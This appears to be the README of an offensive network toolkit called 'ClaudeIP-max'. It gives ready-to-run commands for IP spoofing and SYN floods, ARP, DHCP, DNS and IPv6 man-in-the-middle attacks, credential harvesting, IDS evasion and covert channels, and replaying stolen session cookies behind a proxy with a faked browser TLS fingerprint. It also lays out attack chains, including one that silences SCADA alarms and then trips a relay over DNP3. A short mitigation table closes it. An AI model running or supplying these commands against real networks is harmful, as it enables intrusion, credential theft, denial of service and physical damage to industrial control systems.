# ClaudeIP-max

Packet-level network attack primitives for controlled-environment security research. 17 tools covering Layer 2/3/IPv6/ICS MITM, service discovery poisoning, WebSocket hijacking, IDS/IPS evasion, credential capture, and Chrome TLS session replay.

## Setup

```bash
pip install scapy curl_cffi
```

Raw socket operations require root. BCP 38 / uRPF enforcement on cloud providers (AWS, GCP, Azure) blocks Layer 3 spoofed packets — L2 tools (ARP, DHCP, NDP) are unaffected.

---

## Tools

### Reconnaissance

#### `lan-discovery.py`
ARP scan → port scan → OS fingerprint → attack surface recommendations.

```bash
sudo python3 lan-discovery.py --suggest
sudo python3 lan-discovery.py --full --output lan-hosts.json
```

---

### Internet-Wide

#### `spoofer.py`
Core IP spoofing primitives: TCP SYN flood, UDP amplification/reflection, ICMP redirect, decoy scanning (Nmap -D style), TTL manipulation.

```bash
sudo python3 spoofer.py demo 192.168.1.1
```

#### `spoof-scanner.py`
Identify DDoS amplification vectors across 8 services (Memcached 51,000x, NTP 556x, CharGen 358x). Tests BCP 38 / uRPF enforcement.

```bash
sudo python3 spoof-scanner.py scan --targets 8.8.8.8 --spoof 1.1.1.1
sudo python3 spoof-scanner.py test-bcp38 192.168.1.1 --victim 8.8.8.8
```

#### `ghostport.py`
Port scan without your IP touching the target. 4 inference methods: passive sniffing, timing side-channel, TTL differential, covert channels. Target logs show victim IP.

```bash
sudo python3 ghostport.py scan 192.168.1.100 --victim 8.8.8.8 --ports 80,443,22 --method passive
```

---

### LAN MITM

#### `dhcp-spoof.py`
Rogue DHCP server (RFC 2131). Three modes: `gateway` (become default route), `dns` (poison resolver only), `isolate` (DoS via invalid gateway).

```bash
sudo python3 dhcp-spoof.py --mode gateway -v
sudo python3 dhcp-spoof.py --mode dns
sudo python3 dhcp-spoof.py --mode isolate
```

#### `arp-spoof.py`
ARP cache poisoning with bidirectional mode, gratuitous ARP (3x faster cache update), traffic interception, and clean restore on exit.

```bash
sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 192.168.1.1
sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 192.168.1.1 --intercept
sudo python3 arp-spoof.py restore 192.168.1.100 --spoof-ip 192.168.1.1
```

#### `dns-spoof.py`
Intercept DNS queries and return forged responses. Transaction ID matching prevents rejection. Wildcard mode redirects all traffic.

```bash
sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50
sudo python3 dns-spoof.py --domain "*" --ip 192.168.1.50
```

#### `mitm-suite.py`
Harvest traffic from active ARP/DHCP intercept: HTTP Basic Auth, POST form credentials, session cookies, SSL strip detection.

```bash
sudo python3 mitm-suite.py -v
```

#### `ndp-spoof.py`
IPv6 NDP poisoning: rogue Router Advertisement (ICMPv6 type 134), DHCPv6 steering (M=1 O=1), neighbor cache poison (O=1 override), bidirectional MITM, DAD DoS.

> `hlim=255` is required on all NDP packets — stacks silently drop anything else.

```bash
# Become default IPv6 router via SLAAC
sudo python3 ndp-spoof.py rogue-ra eth0 --prefix 2001:db8:evil:: --len 64 -v

# Force DHCPv6 stateful mode
sudo python3 ndp-spoof.py rogue-ra eth0 --mode dhcpv6 --lifetime 1800

# Remove all default IPv6 routes (DoS)
sudo python3 ndp-spoof.py rogue-ra eth0 --mode dos

# Neighbor cache poisoning
sudo python3 ndp-spoof.py ndp-poison eth0 2001:db8::victim --gateway fe80::1

# Deny all IPv6 address assignments via DAD
sudo python3 ndp-spoof.py dad-dos eth0

# Full MITM: RA + bidirectional NDP
sudo python3 ndp-spoof.py mitm eth0 --prefix fd00:evil:: --victim 2001:db8::100 --gateway fe80::1
```

---

### Protocol Attacks

#### `ws-hijack.py`
WebSocket attack primitives: CSWSH probe (Origin spoofing, cookie injection), raw frame injection, RSV1 covert channel (invisible to DLP/IDS string matching), forge Sec-WebSocket-Accept for MITM handshake positioning.

```bash
# Test if server validates Origin header
python3 ws-hijack.py cswsh ws://target.com/ws --origin http://evil.com --cookies session=abc

# Inject frame into active connection
python3 ws-hijack.py inject ws://target.com/ws --payload '{"action":"admin"}'

# Generate accept token for MITM positioning
python3 ws-hijack.py forge --key dGhlIHNhbXBsZSBub25jZQ==
```

#### `mdns-poison.py`
Poison three LAN service discovery protocols simultaneously. Forge mDNS PTR/SRV/A records, fake WS-Discovery ProbeMatch (ONVIF camera impersonation), broadcast fake SSDP/UPnP IGD.

```bash
# All three protocols simultaneously
sudo python3 mdns-poison.py all --attacker-ip 192.168.1.50 -v

# mDNS only
sudo python3 mdns-poison.py mdns --attacker-ip 192.168.1.50 -v

# Impersonate Hikvision IP camera
sudo python3 mdns-poison.py wsd --attacker-ip 192.168.1.50 --device-name Hikvision-DS-2CD

# Fake UPnP router (IGD)
sudo python3 mdns-poison.py ssdp --attacker-ip 192.168.1.50 --port 8080
```

Optional: `pip install dnslib` for full mDNS record type support.

#### `ics-probe.py`
ICS/OT protocol scanner and packet injector across 5 protocols. None have application-layer auth.

| Protocol | Port | Capabilities |
|----------|------|-------------|
| Modbus/TCP | 502 | FC 01-16 read/write, FC 08/sub-4 listen-only DoS, FC 43 device ID |
| DNP3 | 20000 | FC 0x18 disable unsolicited, FC 0x05 direct operate, FC 0x12 cold restart |
| EtherNet/IP CIP | 44818/tcp, 2222/udp | CIP Reset, Stop PLC, identity enum |
| BACnet/IP | 47808/udp | Who-Is broadcast, COV false sensor injection |
| OPC-UA | 4840 | Hello probe, anonymous browse (SecurityMode=None) |

```bash
# Multi-protocol scan
python3 ics-probe.py scan 192.168.1.100 -v

# Modbus enum + coil write
python3 ics-probe.py modbus 192.168.1.100 enum
python3 ics-probe.py modbus 192.168.1.100 write-coil --unit 1 --addr 0 --value on

# DNP3: disable alarm reporting, then direct relay trip
python3 ics-probe.py dnp3 192.168.1.100 disable-unsolicited
python3 ics-probe.py dnp3 192.168.1.100 operate --point 0 --value on

# EtherNet/IP: enumerate PLC identity, then cold restart
python3 ics-probe.py enip 192.168.1.100 enum
python3 ics-probe.py enip 192.168.1.100 reset

# BACnet: discover then inject false sensor reading
python3 ics-probe.py bacnet 255.255.255.255 scan
python3 ics-probe.py bacnet 192.168.1.100 spoof-cov --device 1234 --type 0 --instance 0 --value 150.0
```

Optional: `pip install opcua` for OPC-UA browse.

---

### Evasion

#### `evasion.py`
IDS/IPS bypass primitives based on the Ptacek-Newsham (1998) insertion/evasion model. Standalone CLI or importable module.

| Technique | Mechanism |
|-----------|-----------|
| Fragment overlap | IDS sees benign decoy; target reassembles real payload (RFC 791 ambiguity) |
| TTL ghost insertion | Ghost packets expire before target; IDS processes them, host ignores them |
| Tiny fragments | 8-byte frags exhaust IDS reassembly buffer/timeout |
| TCP SYN+payload | 4B data in SYN bypasses post-handshake IDS signature engines |
| Lone ACK | No prior SYN; passes stateless FW `--state ESTABLISHED` rules |
| Bad checksum decoy | Target drops (invalid); IDS without checksum validation processes content |
| ICMP covert channel | Loki-style type-0 carrier; XOR-encoded, OS-mimicking payload sizes |
| DNS evasion | Case variation, RFC 1035 compression pointers, covert channel via subdomains |
| ARP jitter | Randomized 15-45s interval stays below Snort threshold (5 replies/10s) |
| Rate profiles | `paranoid` 5/hr · `silent` 5/min · `slow` 30/min · `normal` 2/sec · `aggressive` 10/sec |

```bash
# List profiles and IDS thresholds
python3 evasion.py profiles

# Overlapping fragment evasion
sudo python3 evasion.py frag-overlap --src 10.0.0.1 --dst 10.0.0.2 --payload "GET / HTTP/1.1"

# TCP SYN+payload
sudo python3 evasion.py syn-payload --dst 10.0.0.2 --dport 80 --payload "ATTACK"

# Lone ACK
sudo python3 evasion.py lone-ack --dst 10.0.0.2 --dport 443

# ICMP covert channel
sudo python3 evasion.py icmp-covert --src 10.0.0.1 --dst 10.0.0.2 --data "payload"

# Jittered ARP poison
sudo python3 evasion.py arp-jitter --target 192.168.1.100 --spoof 192.168.1.1 \
     --our-mac de:ad:be:ef:00:01 --target-mac aa:bb:cc:dd:ee:ff
```

Module import:
```python
from evasion import EvasionConfig
ev = EvasionConfig(profile="slow", ip_id_random=True)
ev.send(IP(dst=target)/TCP(dport=80))
```

---

### Defense / Utilities

#### `defense-detector.py`
Detect ARP/DNS spoofing attacks: MAC change monitoring per IP, DNS response inconsistency tracking, attacker MAC identification.

```bash
sudo python3 defense-detector.py arp -v
sudo python3 defense-detector.py dns -v
```

#### `session_replay.py`
Replay captured sessions with Chrome TLS fingerprint impersonation (`curl_cffi` — JA3/JA3s/ALPN). Bypasses TLS fingerprint detection on Cloudflare, Google, etc.

```bash
pip install curl_cffi
python3 session_replay.py probe --cookies cookies.txt --url https://admin.example.com/
python3 session_replay.py enumerate --cookies cookies.txt --domains targets.txt --output results.json
python3 session_replay.py test-tls --url https://tls.browserleaks.com/tls
```

#### `windscribe_socks.py`
Route `curl_cffi` sessions through Windscribe SOCKS5 (localhost:1080). Full chain: proxy + Chrome TLS impersonation + session cookies.

```bash
python3 windscribe_socks.py status
python3 windscribe_socks.py chain --cookies cookies.txt --url https://admin.example.com/ --output result.html
python3 windscribe_socks.py probe https://ipinfo.io/json
```

---

## Attack Chains

### DHCP MITM — stealthy, network-wide

```bash
# T1: rogue DHCP server
sudo python3 dhcp-spoof.py --mode gateway -v

# T2: capture credentials (after target renews lease)
sudo python3 mitm-suite.py -v
```

No continuous poisoning needed. New clients and lease renewals automatically route through attacker.

### ARP MITM — immediate, per-target

```bash
# T1: discover targets
sudo python3 lan-discovery.py --suggest

# T2: poison target ↔ gateway
sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 192.168.1.1 --intercept

# T3: DNS redirect (optional)
sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50

# T4: capture credentials
sudo python3 mitm-suite.py -v
```

### DHCP + DNS — dual-layer poisoning

```bash
# Rogue DHCP pushes attacker as DNS resolver (Option 6)
sudo python3 dhcp-spoof.py --mode dns -v

# All DNS queries now arrive at attacker
sudo python3 dns-spoof.py --domain "*" --ip 192.168.1.50
```

### ICS blind + operate

```bash
# Step 1: blind the SCADA operator (disable alarm reporting)
python3 ics-probe.py dnp3 192.168.1.100 disable-unsolicited

# Step 2: operate relay (no auth required)
python3 ics-probe.py dnp3 192.168.1.100 operate --point 0 --value on
```

---

## Capability Matrix

| Tool | Technique | Scope | Layer | Root |
|------|-----------|-------|-------|------|
| spoofer.py | L3 one-way spoofing | Internet | IPv4 | Yes |
| spoof-scanner.py | Reflection/amplification scan | Internet | IPv4/UDP | Yes |
| ghostport.py | Attribution evasion scan | Internet | TCP | Yes |
| dhcp-spoof.py | Network config hijack | Subnet | DHCP | Yes |
| arp-spoof.py | L2 bidirectional MITM | LAN | ARP | Yes |
| dns-spoof.py | DNS response injection | LAN | DNS/UDP | Yes |
| mitm-suite.py | Credential capture | LAN | HTTP | Yes |
| ndp-spoof.py | IPv6 L2+L3 MITM | LAN | NDP/ICMPv6 | Yes |
| ws-hijack.py | WebSocket session hijack | Any | WebSocket | No |
| mdns-poison.py | Service discovery poisoning | LAN | mDNS/WSD/SSDP | Yes |
| ics-probe.py | ICS/OT control plane | LAN/OT | Modbus/DNP3/CIP | No |
| evasion.py | IDS/IPS bypass | Any | IP/TCP/ICMP/DNS | Yes |
| defense-detector.py | Spoof detection | LAN | ARP/DNS | Yes |
| session_replay.py | TLS-impersonated session replay | Any | TLS/HTTP | No |
| windscribe_socks.py | Proxy-routed session chain | Any | SOCKS5 | No |
| lan-discovery.py | Network reconnaissance | LAN | ARP/TCP | Yes |

---

## Defensive Hardening

| Attack | Mitigation |
|--------|-----------|
| DHCP spoofing | DHCP snooping on managed switches; static IPs |
| ARP spoofing | Dynamic ARP Inspection (DAI); static gateway ARP entries |
| DNS spoofing | DNSSEC; DoH/DoT |
| IPv6 NDP attacks | RA Guard; DHCPv6 Guard; SeND |
| IP spoofing | BCP 38 / uRPF strict mode at network edge |

```bash
# Cisco uRPF strict mode
interface GigabitEthernet0/0
 ip verify unicast source reachable-via rx

# Linux — drop packets failing reverse path filter
iptables -t raw -A PREROUTING -m rpfilter --invert -j DROP
```
